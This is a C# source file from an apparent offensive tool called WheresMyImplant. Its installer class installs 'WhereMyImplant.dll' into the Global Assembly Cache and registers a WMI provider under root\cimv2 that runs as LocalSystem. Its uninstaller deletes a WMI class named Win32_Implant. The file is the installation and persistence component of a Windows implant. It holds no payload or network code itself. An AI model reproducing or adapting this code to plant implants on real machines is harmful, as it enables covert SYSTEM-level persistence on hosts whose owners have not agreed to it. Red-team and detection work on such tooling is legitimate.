using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.EnterpriseServices.Internal;
using System.Management;
using System.Management.Instrumentation;
using System.Reflection;
using System.Runtime.InteropServices;

//https://docs.microsoft.com/en-us/dotnet/framework/app-domains/how-to-create-a-public-private-key-pair
[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem), AssemblyKeyFile("sgKey.snk")]
namespace WheresMyImplant
{
    [RunInstaller(true)]
    public class MyInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {
            try
            {
                Publish publish = new Publish();
                publish.GacInstall("WhereMyImplant.dll");
                base.Install(stateSaver);
                RegistrationServices registrationServices = new RegistrationServices();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public override void Uninstall(IDictionary savedState)
        {
            try
            {
                Publish publish = new Publish();
                publish.GacRemove("WhereMyImplant.dll");
                ManagementClass managementClass = new ManagementClass(@"root\cimv2:Win32_Implant");
                managementClass.Delete();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            try
            {
                base.Uninstall(savedState);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}